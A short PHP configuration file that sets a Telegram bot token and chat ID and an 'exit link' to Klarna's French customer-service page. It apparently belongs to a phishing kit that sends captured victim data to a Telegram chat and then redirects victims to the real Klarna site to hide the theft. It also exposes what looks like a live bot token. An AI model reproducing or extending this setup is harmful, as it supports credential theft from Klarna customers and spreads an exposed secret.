<?php


// telegram information
$token = "8997719403:AAHNYBGkoYff2rzkGf6PZI5FCy7NJqutk4w";
$id = "-5129200641";

// exit link
$exit = "https://www.klarna.com/fr/service-client/";



?>